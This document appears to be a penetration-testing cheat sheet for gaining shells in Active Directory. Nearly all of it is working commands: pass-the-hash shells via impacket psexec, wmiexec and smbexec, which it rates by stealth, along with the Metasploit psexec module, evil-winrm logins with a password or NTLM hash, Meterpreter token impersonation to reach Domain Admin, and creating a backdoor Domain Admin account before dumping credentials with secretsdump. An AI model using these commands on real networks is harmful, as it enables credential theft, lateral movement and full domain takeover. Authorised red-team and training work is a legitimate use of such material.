# Gaining Shell Access in AD

## Pass the Hash → Shell

Once you have NTLM hashes from SAM or secretsdump, use them for shell access:

```sh
# psexec-style shell via impacket
psexec.py domain/user@<ip> -hashes :<NTLM-hash>

# wmiexec (stealthier, runs in process space)
wmiexec.py domain/user@<ip> -hashes :<NTLM-hash>

# smbexec (very stealthy, uses SMB shares)
smbexec.py domain/user@<ip> -hashes :<NTLM-hash>
```

---

## Metasploit Pass the Hash

```sh
msfconsole

use exploit/windows/smb/psexec
set RHOSTS <ip>
set SMBUser <user>
set SMBPass <NTLM-hash>   # format: aad3b...:31d6b...
set SMBDomain <domain>
run
```

---

## Evil-WinRM (WinRM Shell)

```sh
# Password
evil-winrm -i <ip> -u <user> -p <password>

# Hash
evil-winrm -i <ip> -u <user> -H <NTLM-hash>
```
Requires port 5985 open and WinRM enabled.

---

## Metasploit Shell → Incognito (Token Impersonation)

```sh
# Once in meterpreter session
load incognito

# List available tokens
list_tokens -u

# Impersonate a token
impersonate_token "DOMAIN\\DomainAdmin"

# Revert back to original token
rev2self
```

If Domain Admin token is available → you have DA access. See [Token Impersonation](../post-compromise/token-impersonation.md).

---

## Add Domain Admin User (if DA token held)

```sh
net user /add Pentuser Pa33w0rd! /domain
net group "Domain Admins" Pentuser /ADD /DOMAIN

# Then secretsdump with new account
secretsdump.py DOMAIN/Pentuser:'Pa33w0rd!'@<DC-IP>
```

> **Always delete test accounts when done.**
